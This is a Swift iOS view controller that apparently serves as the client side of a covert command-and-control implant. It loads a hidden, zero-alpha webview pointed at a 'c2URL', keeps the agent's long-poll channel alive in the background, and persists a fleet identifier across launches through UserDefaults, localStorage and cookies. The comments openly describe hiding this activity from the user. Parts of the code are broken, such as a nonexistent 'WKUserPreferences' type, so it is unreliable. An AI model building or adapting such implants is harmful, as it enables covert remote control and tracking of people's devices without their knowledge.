import UIKit
import WebKit

class ViewController: UIViewController, WKScriptMessageHandler {

    private var webView: WKWebView?
    private var uid: String?

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black
        uid = UserDefaults.standard.string(forKey: "xg_uid")
        installWebView()
    }

    // A fully transparent, off-stage webview. It is still alive and executing,
    // so the agent's long-poll transport runs while the app is foreground OR
    // backgrounded (the OS keeps JS timers alive under the audio/location
    // background modes). Zero alpha + frame off-screen = invisible.
    private func installWebView() {
        let cfg = WKWebViewConfiguration()
        cfg.websiteDataStore = .default()   // persists localStorage/cookies across launches
        let prefs = WKUserPreferences()
        let script = WKUserScript(source: jsBridge, injectionTime: .atDocumentEnd, forMainFrameOnly: false)
        prefs.add(script)
        cfg.userContentController = WKUserContentController()
        cfg.userContentController.addMessageHandler(self, scriptName: "bridge")
        cfg.userContentController.addUserScript(script)

        let wv = WKWebView(frame: view.bounds, configuration: cfg)
        wv.alpha = 0.0
        wv.isUserInteractionEnabled = false
        wv.navigationDelegate = self
        view.addSubview(wv)           // subview keeps it alive; webView property too
        webView = wv
        load()
    }

    private func load() {
        var comps = URLComponents(string: Cfg.c2URL)
        if let uid, !uid.isEmpty { comps?.queryItems = [URLQueryItem(name: "uid", value: uid)] }
        guard let url = comps?.url else { return }
        webView?.load(URLRequest(url: url))
    }

    // The native side of the bridge. The agent posts its uid here once it has
    // (re)computed it; we stash it in UserDefaults so every future launch can
    // re-inject the SAME uid -> same Durable Object fleet entry.
    func userContentController(_ c: WKUserContentController, didReceive message: WKScriptMessage) {
        guard message.name == "bridge", let body = message.body as? [String: Any],
              let u = body["uid"] as? String, !u.isEmpty else { return }
        UserDefaults.standard.set(u, forKey: "xg_uid")
        if uid == nil { uid = u; print("[xag] uid captured: \(u)") }
    }

    // Re-run the JS bridge on every (re)load so a fresh WKWebView re-stores the
    // uid even if the prior process was killed before persisting it.
    private var jsBridge: String { """
    (function(){
      try {
        var uid = null;
        try { uid = new URL(location.href).searchParams.get('uid'); } catch(e){}
        if (!uid) uid = localStorage.getItem('xg_uid');
        if (!uid) uid = document.cookie.split(';').map(function(s){return s.trim();}).filter(function(s){return s.indexOf('xg_uid=')===0;})[0];
        if (uid) window.webkit.messageHandlers.bridge.postMessage({uid: uid});
      } catch(e){}
    })();
    """ }
}

extension ViewController: WKNavigationDelegate {}
